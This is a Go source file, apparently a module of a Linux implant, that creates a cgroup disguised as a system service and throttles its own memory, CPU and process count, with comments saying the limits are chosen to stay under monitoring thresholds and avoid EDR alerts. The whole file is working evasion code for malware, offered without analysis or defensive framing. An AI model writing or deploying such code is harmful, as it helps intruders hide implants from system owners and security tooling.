package namespace

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"

	"golang.org/x/sys/unix"
)

const (
	// cgroupBase is the cgroupv2 unified hierarchy mount point.
	cgroupBase = "/sys/fs/cgroup"

	// cgroupName is the private cgroup for the implant.
	// Named to blend with legitimate system services.
	cgroupName = "system.slice/system-worker.scope"

	// Resource limits chosen to stay below monitoring thresholds.
	// 50MB memory soft limit, 100MB hard limit.
	memorySoftLimit = 50 * 1024 * 1024
	memoryHardLimit = 100 * 1024 * 1024

	// CPU: limit to 5% of a single core (50ms per 1000ms period).
	// This prevents CPU spikes that EDR tools flag.
	cpuQuota  = 50000   // microseconds
	cpuPeriod = 1000000 // microseconds

	// Max 32 PIDs to constrain fork behavior.
	pidsMax = 32
)

// SetupCgroupNamespace configures the cgroup namespace for the implant.
// It creates a private cgroup with conservative resource limits to avoid
// detection through anomalous resource consumption.
func SetupCgroupNamespace() error {
	cgroupPath := filepath.Join(cgroupBase, cgroupName)

	// Detect cgroup version. Try cgroupv2 first, fall back to v1.
	if isCgroupV2() {
		return setupCgroupV2(cgroupPath)
	}
	return setupCgroupV1()
}

// isCgroupV2 returns true if the system uses the unified cgroup hierarchy.
func isCgroupV2() bool {
	var st unix.Statfs_t
	if err := unix.Statfs(cgroupBase, &st); err != nil {
		return false
	}
	// CGROUP2_SUPER_MAGIC = 0x63677270
	return st.Type == 0x63677270
}

// setupCgroupV2 creates and configures a cgroupv2 cgroup for the implant.
func setupCgroupV2(cgroupPath string) error {
	// Create the cgroup directory hierarchy.
	if err := os.MkdirAll(cgroupPath, 0750); err != nil {
		return fmt.Errorf("cgroup: failed to create cgroup dir %s: %w", cgroupPath, err)
	}

	// Write resource constraints.
	limits := map[string]string{
		"memory.high": strconv.Itoa(memorySoftLimit),
		"memory.max":  strconv.Itoa(memoryHardLimit),
		"cpu.max":     fmt.Sprintf("%d %d", cpuQuota, cpuPeriod),
		"pids.max":    strconv.Itoa(pidsMax),
	}

	for file, value := range limits {
		path := filepath.Join(cgroupPath, file)
		if err := os.WriteFile(path, []byte(value), 0640); err != nil {
			// Non-fatal: some controllers may not be available.
			// Continue setting what we can.
			continue
		}
	}

	// Move the current process into this cgroup.
	procsPath := filepath.Join(cgroupPath, "cgroup.procs")
	pid := strconv.Itoa(os.Getpid())
	if err := os.WriteFile(procsPath, []byte(pid), 0640); err != nil {
		return fmt.Errorf("cgroup: failed to move pid %s into cgroup: %w", pid, err)
	}

	return nil
}

// CleanupCgroups removes the cgroup directories created by SetupCgroupNamespace.
// The cgroup must be empty (no processes) before it can be removed.
// Best-effort; errors are silently ignored.
func CleanupCgroups() {
	// cgroupv2 unified path.
	v2Path := filepath.Join(cgroupBase, cgroupName)
	_ = os.Remove(v2Path)

	// cgroupv1 per-controller paths.
	for _, controller := range []string{"memory", "cpu", "pids"} {
		v1Path := filepath.Join("/sys/fs/cgroup", controller, cgroupName)
		_ = os.Remove(v1Path)
	}
}

// setupCgroupV1 creates cgroups under the v1 hierarchy for key controllers.
func setupCgroupV1() error {
	controllers := map[string]map[string]string{
		"memory": {
			"memory.limit_in_bytes":      strconv.Itoa(memoryHardLimit),
			"memory.soft_limit_in_bytes": strconv.Itoa(memorySoftLimit),
		},
		"cpu": {
			"cpu.cfs_quota_us":  strconv.Itoa(cpuQuota),
			"cpu.cfs_period_us": strconv.Itoa(cpuPeriod),
		},
		"pids": {
			"pids.max": strconv.Itoa(pidsMax),
		},
	}

	pid := strconv.Itoa(os.Getpid())

	for controller, limits := range controllers {
		cgroupPath := filepath.Join("/sys/fs/cgroup", controller, cgroupName)

		if err := os.MkdirAll(cgroupPath, 0750); err != nil {
			// Controller may not be mounted; skip.
			continue
		}

		for file, value := range limits {
			path := filepath.Join(cgroupPath, file)
			_ = os.WriteFile(path, []byte(value), 0640)
		}

		// Move process into this controller's cgroup.
		tasksPath := filepath.Join(cgroupPath, "tasks")
		_ = os.WriteFile(tasksPath, []byte(pid), 0640)
	}

	return nil
}
